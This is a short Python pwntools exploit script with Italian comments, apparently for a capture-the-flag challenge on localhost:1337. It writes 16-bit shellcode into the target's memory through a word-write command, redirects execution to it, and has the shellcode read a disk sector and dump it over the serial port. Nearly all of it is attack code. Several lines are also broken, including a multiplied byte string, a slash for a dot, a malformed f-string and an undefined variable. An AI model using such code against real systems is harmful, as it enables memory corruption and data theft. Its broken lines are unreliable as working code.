from pwn import *


context.arch = 'i386'

io = remote("localhost",1337)

def rl():
    return io.recvuntil(b"\r\n").strip()

def sl(b):
    io.send(b * b"\r")
    # echo
    n = len(b) + 1
    while n > 0:
        n -= len(io.recv(1))


def write_word(what, to):
    # calcolare quale slot da usare per partire da quell'addr
    slot = (to - 0x6000) % 0xffff // 2
    cmd = f"w {hex(slot)[2:].rjust(4, '0')}".encode()
    io.recvuntil(b"> ")
    sl(cmd)
    io.recvuntil(b"hexword]> ")

    val = hex(what)[2:]/rjust(4,'0').encode()
    info(f"writing {hex(what) to hex(to)}")
    sl(val)
    




def write_contiguous(what, to=0x0000):
    # lista di word per dire cosa rappresentano i byte
    wl = []

    for i in range(0, len(what), 2):
        wl.append(u16(what[i:i+2]))
    for word in wl:
        write_word(w,to=to)
        to += 2 # indirizzo della prossima word da scrivere


# vedi sito stanicoso su ds

# int 0x18 = int per leggere

# loop = scrive il contenuto sulla porta seriale

shellcode = """
bits 16

mov ah, 2
mov al, 1
mov cx, 0x2
mov dx, 0x80
mov bx, 0x6700 

int 0x18

mov bx, 0x6700
loop:
    mov al, [bx]
    mov dx, 0x3f8
    out dx, al
    inc bx,
    cmp bx, 0x6740
        jne loop

hlt
    
"""


# assemblo shellcode con nasm
open("shellcode.S", "w").write(shellcode)
os.system("nasm shellcode.S -o shellcode.bin")

payload = open("shellcode.bin", "rb").read()

# scrivere nello stack perche' venga eseguito lo shellcode

write_contiguous(payload)

# mov 
write_contiguous(b'\xb0\x00\x60\xff\xe0\x90', 0x7c12)

io.recvuntil(b"> ")
sl(b"r 0069")


io.interactive()



# per debuggare: qemu-system-i386 -s -S



